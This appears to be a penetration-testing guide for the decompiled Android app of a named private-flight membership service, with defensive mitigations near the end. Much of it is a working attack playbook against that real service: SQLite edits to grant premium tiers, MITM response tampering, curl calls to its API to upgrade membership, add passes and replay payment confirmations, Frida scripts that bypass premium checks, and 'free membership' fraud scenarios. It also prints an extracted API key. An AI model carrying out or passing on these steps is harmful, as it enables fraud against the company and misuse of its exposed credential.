# Vaunt Flight App - Testing Guide and Analysis Notes

**Date Created:** November 3, 2025
**Last Updated:** November 3, 2025
**Status:** Ready for Testing

---

## Executive Summary

This document provides comprehensive testing instructions for validating the security vulnerabilities identified in the Vaunt Flight App (com.volato.vaunt). All findings are based on static analysis of the decompiled APK located in `/home/runner/workspace/uploads/`.

**CRITICAL:** This is for authorized security testing only. All tests should be performed in a controlled environment on test accounts.

---

## File Locations

### APK and Decompiled Files
- **Original APK Package:** `/home/runner/workspace/uploads/Vaunt.xapk`
- **Decompiled Archive:** `/home/runner/workspace/uploads/decompiled_vaunt.zip`
- **Extracted Main APK:** `/home/runner/workspace/uploads/extracted_main_apk/`
- **Decompiled Analysis:** `/home/runner/workspace/uploads/decompiled_analysis/decompiled_vaunt/`
- **JavaScript Bundle:** `/home/runner/workspace/uploads/extracted_main_apk/assets/index.android.bundle` (6.4 MB)
- **AndroidManifest:** `/home/runner/workspace/uploads/decompiled_analysis/decompiled_vaunt/AndroidManifest.xml`

### Key Files for Analysis
1. **Main App Bundle:** `index.android.bundle` - Contains all React Native JavaScript code
2. **Manifest:** `AndroidManifest.xml` - Contains permissions, API keys, and app configuration
3. **Smali Code:** `decompiled_analysis/decompiled_vaunt/smali/` - Decompiled Java/Kotlin code

---

## Application Architecture

### Technology Stack
- **Platform:** React Native / Expo
- **Package Name:** com.volato.vaunt
- **Version:** 1.1.36
- **Target SDK:** Android 34 (Android 14)
- **Min SDK:** Not specified in manifest

### Key Technologies
- **Storage:** AsyncStorage (unencrypted)
- **Backend:** Firebase
- **Payment:** Stripe, Apple Pay
- **Analytics:** Mixpanel, AppsFlyer, Facebook SDK
- **Push Notifications:** OneSignal, Firebase Cloud Messaging
- **Support:** Intercom
- **Error Tracking:** Sentry
- **Maps:** Google Maps API

### Exposed API Keys & Credentials
- **Google Maps API Key:** `AIzaSyCDM5k8fjgrQER4OaAzmaXUflX6TL-WVQw`
- **Facebook App Integration:** Configured (keys in resources)
- **Firebase Configuration:** Exposed in manifest

---

## Critical Vulnerabilities Identified

### 1. UNENCRYPTED CLIENT-SIDE STORAGE (CRITICAL)
**Risk Level:** HIGH
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

**Description:**
App uses AsyncStorage for local data persistence, which stores data in plain text and is easily accessible on rooted/jailbroken devices.

**Evidence Found:**
- Multiple references to AsyncStorage in JavaScript bundle
- No encryption layer detected
- No root/jailbreak detection implemented

### 2. CLIENT-SIDE MEMBERSHIP VALIDATION (CRITICAL)
**Risk Level:** HIGH
**CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security)

**Description:**
Membership status, subscription levels, and priority passes appear to be validated client-side.

**Evidence Found:**
- Strings in bundle: "Cabin+ membership expires on", "Your subscription expires on"
- References to membership tiers in JavaScript bundle
- Priority upgrade purchase flows in client code

### 3. NO CERTIFICATE PINNING (HIGH)
**Risk Level:** HIGH
**CWE:** CWE-295 (Improper Certificate Validation)

**Description:**
No SSL certificate pinning detected, allowing man-in-the-middle attacks via proxy tools.

**API Endpoints Discovered:**
- `/v1/user/createApplePaySetupIntent`
- Multiple Stripe payment endpoints
- Firebase endpoints

### 4. EXPOSED BUSINESS LOGIC (MEDIUM-HIGH)
**Risk Level:** MEDIUM-HIGH
**CWE:** CWE-540 (Information Exposure Through Source Code)

**Description:**
Entire application logic visible in unobfuscated JavaScript bundle.

**Impact:**
- Complete visibility into authentication flows
- API endpoints exposed
- Validation logic reverse-engineerable

### 5. NO ANTI-TAMPERING PROTECTION (HIGH)
**Risk Level:** HIGH
**CWE:** CWE-353 (Missing Support for Integrity Check)

**Missing Protections:**
- No root/jailbreak detection
- No runtime integrity checks
- No anti-debugging measures
- No code obfuscation (JavaScript bundle is readable)

---

## Testing Instructions

### Prerequisites

**Required Tools:**
1. **ADB (Android Debug Bridge)** - For device interaction
2. **Android Emulator or Physical Device** (Rooted preferred)
3. **Burp Suite / mitmproxy** - For traffic interception
4. **Frida** - For runtime manipulation
5. **apktool** - Already used for decompilation
6. **Text Editor** - For modifying AsyncStorage data

**Required Setup:**
- Test account in the Vaunt app
- Rooted Android device or emulator
- SSL proxy certificate installed on device
- Familiarity with Android app data directories

---

## Test Scenarios

### TEST 1: AsyncStorage Data Inspection and Manipulation

**Objective:** Verify that sensitive data is stored unencrypted and can be modified.

**Prerequisites:**
- Rooted Android device or emulator
- Vaunt app installed
- User logged in

**Steps:**

1. **Install the App:**
   ```bash
   # If you have the APK extracted
   adb install path/to/vaunt.apk
   ```

2. **Log into the app** and note your current membership status

3. **Locate AsyncStorage files:**
   ```bash
   # Find app data directory
   adb shell
   cd /data/data/com.volato.vaunt/

   # React Native AsyncStorage is typically in:
   cd /data/data/com.volato.vaunt/databases/
   # OR
   cd /data/data/com.volato.vaunt/shared_prefs/
   # OR
   cd /data/data/com.volato.vaunt/files/

   # List files
   ls -la
   ```

4. **Pull the storage files:**
   ```bash
   # Pull RKStorage (common React Native AsyncStorage)
   adb pull /data/data/com.volato.vaunt/databases/ ./vaunt_storage/
   ```

5. **Inspect the data:**
   ```bash
   # Look for AsyncStorage database
   sqlite3 vaunt_storage/RKStorage
   .tables
   SELECT * FROM catalystLocalStorage;
   ```

6. **Look for sensitive keys:**
   - User authentication tokens
   - Membership status/level
   - Subscription expiration dates
   - Priority pass counts
   - Payment information

7. **Modify the data (TEST ONLY):**
   ```bash
   # Example: Change membership tier
   UPDATE catalystLocalStorage
   SET value = '{"membershipLevel":"cabin_plus","status":"active"}'
   WHERE key LIKE '%membership%';
   ```

8. **Push modified data back:**
   ```bash
   adb push ./vaunt_storage/RKStorage /data/data/com.volato.vaunt/databases/
   ```

9. **Restart the app** and check if changes persist

**Expected Result:**
✅ Data is readable in plain text
✅ Modified data is accepted by the app
✅ App grants premium features based on modified local data

**Actual Result:** [TO BE FILLED DURING TESTING]

---

### TEST 2: Man-in-the-Middle (MITM) Attack

**Objective:** Intercept and modify API traffic to manipulate membership status.

**Prerequisites:**
- Burp Suite or mitmproxy installed
- Proxy certificate installed on Android device
- Network configured to route through proxy

**Steps:**

1. **Set up Burp Suite:**
   ```bash
   # Start Burp Suite on default port 8080
   # Install Burp CA certificate on Android device
   ```

2. **Configure Android device proxy:**
   ```bash
   adb shell settings put global http_proxy <your-ip>:8080
   ```

3. **Launch the app** and perform actions:
   - Log in
   - View profile/account settings
   - Attempt to access premium features
   - Make a booking

4. **Capture API requests in Burp Suite**

5. **Look for interesting endpoints:**
   - `/v1/user/profile`
   - `/v1/user/createApplePaySetupIntent`
   - `/v1/membership/status`
   - `/v1/subscription/*`
   - `/v1/priority/*`

6. **Intercept a membership status response:**
   - Find a response containing membership data
   - Modify the response:
     ```json
     {
       "membershipLevel": "cabin_plus",
       "subscriptionStatus": "active",
       "subscriptionExpiresAt": "2099-12-31T23:59:59Z",
       "priorityPasses": 999
     }
     ```

7. **Forward the modified response**

8. **Observe app behavior**

**Expected Result:**
✅ Traffic is interceptable
✅ No certificate pinning prevents MITM
✅ Modified responses are accepted by app
✅ Premium features become available

**Actual Result:** [TO BE FILLED DURING TESTING]

---

### TEST 3: API Endpoint Fuzzing

**Objective:** Test API endpoints for authorization and validation issues.

**Prerequisites:**
- Valid authentication token captured from TEST 2
- Tool like curl, Postman, or Python requests library

**Steps:**

1. **Extract authentication token** from intercepted requests

2. **Test membership status endpoint:**
   ```bash
   # Get current status
   curl -X GET https://api.vaunt.com/v1/user/profile \
     -H "Authorization: Bearer <your-token>" \
     -H "Content-Type: application/json"
   ```

3. **Attempt to modify membership via API:**
   ```bash
   # Try to upgrade membership
   curl -X POST https://api.vaunt.com/v1/user/membership \
     -H "Authorization: Bearer <your-token>" \
     -H "Content-Type: application/json" \
     -d '{"membershipLevel": "cabin_plus", "expiresAt": "2099-12-31"}'
   ```

4. **Test priority pass manipulation:**
   ```bash
   # Add priority passes
   curl -X POST https://api.vaunt.com/v1/user/priority-passes \
     -H "Authorization: Bearer <your-token>" \
     -H "Content-Type: application/json" \
     -d '{"passes": 10}'
   ```

5. **Test payment endpoint security:**
   ```bash
   # Attempt payment confirmation replay
   curl -X POST https://api.vaunt.com/v1/payment/confirm \
     -H "Authorization: Bearer <your-token>" \
     -H "Content-Type: application/json" \
     -d '{"paymentIntentId": "pi_xxxxx", "status": "succeeded"}'
   ```

**Expected Result:**
✅ Endpoints lack proper server-side validation
✅ Client can manipulate membership/subscription data
✅ Payment confirmations can be replayed

**Actual Result:** [TO BE FILLED DURING TESTING]

---

### TEST 4: Runtime Instrumentation with Frida

**Objective:** Hook into app functions at runtime to bypass client-side checks.

**Prerequisites:**
- Frida installed on host machine
- Frida server running on Android device
- Device rooted

**Steps:**

1. **Install Frida server on device:**
   ```bash
   # Download frida-server for your Android architecture
   adb push frida-server /data/local/tmp/
   adb shell "chmod 755 /data/local/tmp/frida-server"
   adb shell "/data/local/tmp/frida-server &"
   ```

2. **List running processes:**
   ```bash
   frida-ps -U
   ```

3. **Create Frida script to hook AsyncStorage:**
   ```javascript
   // File: hook_asyncstorage.js
   Java.perform(function() {
       var AsyncStorage = Java.use('com.reactnativecommunity.asyncstorage.AsyncStorageModule');

       // Hook getItem
       AsyncStorage.getItem.implementation = function(key, callback) {
           console.log('[AsyncStorage] getItem called for key: ' + key);
           var result = this.getItem(key, callback);
           return result;
       };

       // Hook setItem
       AsyncStorage.setItem.implementation = function(key, value, callback) {
           console.log('[AsyncStorage] setItem called');
           console.log('  Key: ' + key);
           console.log('  Value: ' + value);

           // Intercept membership changes
           if (key.indexOf('membership') >= 0 || key.indexOf('subscription') >= 0) {
               console.log('[!] MEMBERSHIP DATA DETECTED');
           }

           return this.setItem(key, value, callback);
       };
   });
   ```

4. **Run Frida script:**
   ```bash
   frida -U -f com.volato.vaunt -l hook_asyncstorage.js --no-pause
   ```

5. **Use the app** and observe logged data

6. **Create script to bypass premium checks:**
   ```javascript
   // File: bypass_premium.js
   Java.perform(function() {
       // Hook function that checks membership status
       // This requires identifying the actual function name from analysis

       var SomeClass = Java.use('com.volato.vaunt.SomeClass');
       SomeClass.isPremiumUser.implementation = function() {
           console.log('[!] Premium check bypassed - returning true');
           return true;
       };
   });
   ```

**Expected Result:**
✅ AsyncStorage operations are interceptable
✅ Membership validation functions can be hooked
✅ Premium checks can be bypassed at runtime

**Actual Result:** [TO BE FILLED DURING TESTING]

---

### TEST 5: JavaScript Bundle Analysis

**Objective:** Extract and analyze hardcoded secrets, API endpoints, and logic flaws.

**Steps:**

1. **Extract and format the JavaScript bundle:**
   ```bash
   # Bundle location
   cd /home/runner/workspace/uploads/extracted_main_apk/assets/

   # The bundle is minified, attempt to beautify
   cat index.android.bundle | js-beautify > bundle_readable.js
   ```

2. **Search for sensitive strings:**
   ```bash
   # Search for API keys
   grep -i "api.key\|apikey\|secret\|password\|token" bundle_readable.js

   # Search for membership-related logic
   grep -i "cabin_plus\|membership\|subscription\|premium" bundle_readable.js

   # Search for API endpoints
   grep -o 'https\?://[^"]*' bundle_readable.js | sort -u

   # Search for AsyncStorage usage
   grep -n "AsyncStorage\." bundle_readable.js | head -50
   ```

3. **Identify validation functions:**
   ```bash
   # Look for membership validation
   grep -A 20 -B 5 "isPremium\|checkMembership\|validateSub" bundle_readable.js
   ```

4. **Extract API endpoint list:**
   ```bash
   grep -oE '/v1/[a-zA-Z0-9/_-]+' bundle_readable.js | sort -u > api_endpoints.txt
   ```

**Expected Result:**
✅ API endpoints discovered
✅ Validation logic identified
✅ Client-side checks visible
✅ Potential hardcoded secrets found

**Actual Result:** [TO BE FILLED DURING TESTING]

---

## Proof of Concept Attack Scenarios

### SCENARIO 1: Free Premium Membership

**Attack Flow:**
1. Create free/basic account
2. Root Android device
3. Extract AsyncStorage database
4. Modify membership data:
   ```json
   {
     "membershipLevel": "cabin_plus",
     "subscriptionStatus": "active",
     "subscriptionExpiresAt": "2099-12-31T23:59:59Z"
   }
   ```
5. Push modified data back to device
6. Restart app
7. Access premium features without payment

**Impact:** Revenue loss, unauthorized access to premium features

---

### SCENARIO 2: Infinite Priority Passes

**Attack Flow:**
1. Purchase one legitimate priority pass
2. Intercept API response with Burp Suite
3. Capture payment confirmation
4. Modify response to increment pass count to 999
5. Replay successful payment responses
6. Use unlimited passes without additional payment

**Impact:** Fraud, revenue loss, unfair advantage

---

### SCENARIO 3: Waitlist Priority Manipulation

**Attack Flow:**
1. Join waitlist for popular flight
2. Access AsyncStorage
3. Modify waitlist priority score
4. Jump to front of waitlist
5. Book desirable flights unfairly

**Impact:** Customer experience degradation, unfair booking advantage

---

## Recommended Mitigations (For Development Team)

### IMMEDIATE ACTIONS (Critical Priority)

#### 1. Implement Server-Side Validation
**What to do:**
- Move ALL membership checks to server-side
- Validate subscription status on every API call
- Implement server-side session management
- Never trust client-submitted data for authorization

**Code Example (Backend):**
```javascript
// BEFORE (Vulnerable - Client-side only)
if (user.membershipLevel === 'cabin_plus') {
    // Grant access
}

// AFTER (Secure - Server-side validation)
async function checkMembership(userId) {
    const user = await db.users.findOne({ id: userId });
    const subscription = await paymentService.getSubscription(user.subscriptionId);

    if (!subscription.active || subscription.expiresAt < Date.now()) {
        throw new Error('Invalid or expired subscription');
    }

    return user.membershipLevel;
}
```

#### 2. Implement Encrypted Storage
**What to do:**
- Replace AsyncStorage with encrypted alternatives:
  - **Android:** Use EncryptedSharedPreferences or Android Keystore
  - **iOS:** Use Keychain Services
- Never store subscription status locally
- Only store encrypted, short-lived session tokens

**Implementation:**
```bash
# Install secure storage library
npm install react-native-encrypted-storage
```

```javascript
// BEFORE
import AsyncStorage from '@react-native-async-storage/async-storage';
await AsyncStorage.setItem('userToken', token);

// AFTER
import EncryptedStorage from 'react-native-encrypted-storage';
await EncryptedStorage.setItem('userToken', token);
```

#### 3. Implement Certificate Pinning
**What to do:**
- Pin SSL certificates to prevent MITM attacks
- Use libraries like `react-native-ssl-pinning`

**Implementation:**
```bash
npm install react-native-ssl-pinning
```

```javascript
import { fetch } from 'react-native-ssl-pinning';

fetch('https://api.vaunt.com/v1/user/profile', {
  method: 'GET',
  pkPinning: true,
  sslPinning: {
    certs: ['mycert'] // Certificate in assets folder
  }
});
```

#### 4. Add Root/Jailbreak Detection
**What to do:**
- Detect compromised devices
- Block or warn users on rooted/jailbroken devices

**Implementation:**
```bash
npm install react-native-device-info
```

```javascript
import DeviceInfo from 'react-native-device-info';

if (await DeviceInfo.isRooted()) {
    Alert.alert(
        'Security Warning',
        'This app cannot run on rooted devices for security reasons.'
    );
    // Optionally block app functionality
}
```

### SHORT TERM ACTIONS (High Priority)

#### 5. Enable Code Obfuscation
**What to do:**
- Enable Hermes bytecode for React Native
- Implement JavaScript obfuscation
- Use ProGuard/R8 for native Android code

**Implementation:**
```javascript
// android/app/build.gradle
project.ext.react = [
    enableHermes: true,  // Enable Hermes
    hermesCommand: "../../node_modules/hermes-engine/...",
]
```

#### 6. Implement API Security
**What to do:**
- Add request signing
- Implement rate limiting
- Use short-lived JWT tokens (5-15 min expiry)
- Implement refresh token rotation
- Add device fingerprinting

#### 7. Add Runtime Integrity Checks
**What to do:**
- Detect tampering attempts
- Validate app signature at runtime
- Monitor for debugging/hooking frameworks (Frida, Xposed)

### LONG TERM ACTIONS (Important)

#### 8. Regular Security Audits
- Quarterly penetration testing
- Bug bounty program
- Code security reviews

#### 9. Monitoring & Analytics
- Track suspicious behavior patterns
- Monitor for API abuse
- Alert on unusual membership upgrades

#### 10. User Education
- Terms of Service enforcement
- Account bans for abuse
- Legal consequences disclosure

---

## Testing Checklist

Use this checklist during testing:

- [ ] TEST 1: AsyncStorage inspection completed
  - [ ] Located storage files
  - [ ] Extracted and read data
  - [ ] Identified sensitive information
  - [ ] Attempted data modification
  - [ ] Verified app accepts modified data

- [ ] TEST 2: MITM attack completed
  - [ ] Proxy configured and working
  - [ ] Traffic successfully intercepted
  - [ ] API endpoints identified
  - [ ] Response modification attempted
  - [ ] Modified responses accepted by app

- [ ] TEST 3: API fuzzing completed
  - [ ] Auth token extracted
  - [ ] Membership endpoints tested
  - [ ] Priority pass manipulation attempted
  - [ ] Payment endpoints tested

- [ ] TEST 4: Frida hooking completed
  - [ ] Frida server running
  - [ ] AsyncStorage hooks working
  - [ ] Premium checks identified
  - [ ] Runtime bypass successful

- [ ] TEST 5: Bundle analysis completed
  - [ ] Bundle extracted and readable
  - [ ] Sensitive strings identified
  - [ ] API endpoints documented
  - [ ] Validation logic mapped

---

## Tools Reference

### ADB Commands
```bash
# Install APK
adb install app.apk

# Shell access
adb shell

# Pull files from device
adb pull /path/on/device /path/on/computer

# Push files to device
adb push /path/on/computer /path/on/device

# View logs
adb logcat | grep com.volato.vaunt

# Set proxy
adb shell settings put global http_proxy <ip>:<port>

# Clear proxy
adb shell settings put global http_proxy :0
```

### Frida Commands
```bash
# List running processes
frida-ps -U

# Attach to app
frida -U com.volato.vaunt

# Run script
frida -U -l script.js com.volato.vaunt

# Spawn app with script
frida -U -f com.volato.vaunt -l script.js --no-pause
```

### Burp Suite Setup
1. Start Burp Suite
2. Proxy → Options → Proxy Listeners → Add (0.0.0.0:8080)
3. Export CA certificate
4. Install certificate on Android device:
   - Settings → Security → Install from storage
5. Configure device proxy to point to Burp IP:8080

---

## Important Notes

### Legal & Ethical Considerations

**CRITICAL WARNINGS:**

1. **Authorization Required:** Only perform these tests with explicit written authorization
2. **Test Accounts Only:** Use dedicated test accounts, never production user accounts
3. **Controlled Environment:** Conduct tests in isolated environments
4. **No Real Transactions:** Do not complete actual bookings or payments during testing
5. **Data Protection:** Handle any user data according to GDPR/privacy regulations
6. **Responsible Disclosure:** Report findings responsibly to Vaunt security team

### Laws Applicable
- Computer Fraud and Abuse Act (CFAA) - United States
- Digital Millennium Copyright Act (DMCA) - United States
- Computer Misuse Act - United Kingdom
- Terms of Service violations

**DO NOT:**
- Exploit vulnerabilities on production systems without authorization
- Share vulnerabilities publicly before responsible disclosure
- Use exploits for personal gain
- Interfere with legitimate users

---

## Test Results Template

When you complete testing, document results here:

```markdown
## Test Execution Results

**Tester:** [Name]
**Date:** [Date]
**Environment:** [Device/Emulator Details]
**App Version:** 1.1.36

### Test 1: AsyncStorage Manipulation
- **Status:** [PASS/FAIL/PARTIAL]
- **Findings:** [Description]
- **Screenshots:** [Link/Path]
- **Severity:** [LOW/MEDIUM/HIGH/CRITICAL]

### Test 2: MITM Attack
- **Status:** [PASS/FAIL/PARTIAL]
- **Findings:** [Description]
- **API Endpoints Discovered:** [List]
- **Severity:** [LOW/MEDIUM/HIGH/CRITICAL]

### Test 3: API Fuzzing
- **Status:** [PASS/FAIL/PARTIAL]
- **Vulnerable Endpoints:** [List]
- **Exploit Success:** [YES/NO]
- **Severity:** [LOW/MEDIUM/HIGH/CRITICAL]

### Test 4: Runtime Instrumentation
- **Status:** [PASS/FAIL/PARTIAL]
- **Functions Hooked:** [List]
- **Bypass Success:** [YES/NO]
- **Severity:** [LOW/MEDIUM/HIGH/CRITICAL]

### Test 5: Static Analysis
- **Secrets Found:** [List]
- **Logic Flaws:** [Description]
- **Risk Assessment:** [Description]
```

---

## Additional Resources

### Official Documentation
- Security Analysis Report: `/home/runner/workspace/SECURITY_ANALYSIS_REPORT.md`
- Decompiled Source: `/home/runner/workspace/uploads/decompiled_analysis/`

### Recommended Reading
- OWASP Mobile Security Testing Guide: https://mobile-security.gitbook.io/
- OWASP Mobile Top 10: https://owasp.org/www-project-mobile-top-10/
- React Native Security Best Practices: https://reactnative.dev/docs/security

### Contact
For questions or to report findings, contact the appropriate security team.

---

**Document Version:** 1.0
**Status:** Ready for Testing
**Next Review:** After test execution
